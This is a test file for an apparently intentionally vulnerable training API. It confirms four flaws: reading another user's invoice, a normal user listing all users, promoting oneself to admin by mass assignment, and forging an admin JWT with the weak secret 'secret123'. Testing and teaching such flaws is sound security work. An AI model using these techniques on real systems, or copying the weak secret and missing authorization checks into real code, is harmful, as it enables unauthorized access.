// Proves each flaw really exists in vulnerable mode. A passing test here means
// the attack worked.
import assert from 'node:assert/strict';
import { after, before, beforeEach, describe, it } from 'node:test';
import jwt from 'jsonwebtoken';
import request from 'supertest';
import { loadConfig } from '../src/config.js';
import { appFor, bearer, login, seed, startDatabase, stopDatabase } from './helpers.js';

describe('flaws in vulnerable mode', () => {
  const app = appFor(loadConfig({ APP_MODE: 'vulnerable' }));

  before(startDatabase);
  after(stopDatabase);
  beforeEach(seed);

  it('BOLA: Bob can read Alice\'s invoice', async () => {
    const token = await login(app, 'bob');
    const res = await request(app).get('/invoices/1001').set(bearer(token));
    assert.equal(res.status, 200);
    assert.equal(res.body.customer, 'Fictional Bakery Co');
  });

  it('BFLA: a normal user can list all users', async () => {
    const token = await login(app, 'bob');
    const res = await request(app).get('/admin/users').set(bearer(token));
    assert.equal(res.status, 200);
    assert.equal(res.body.length, 3);
  });

  it('Mass assignment: a user can make themselves an admin', async () => {
    const token = await login(app, 'bob');
    const res = await request(app).patch('/profile/me').set(bearer(token)).send({ role: 'admin' });
    assert.equal(res.status, 200);
    assert.equal(res.body.role, 'admin');

    const newToken = await login(app, 'bob');
    const stats = await request(app).get('/admin/stats').set(bearer(newToken));
    assert.equal(stats.status, 200);
  });

  it('Weak JWT secret: a forged token gets admin access', async () => {
    const forged = jwt.sign({ sub: '000000000000000000000000', role: 'admin' }, 'secret123', {
      algorithm: 'HS256',
    });
    const res = await request(app).get('/admin/stats').set(bearer(forged));
    assert.equal(res.status, 200);
  });
});
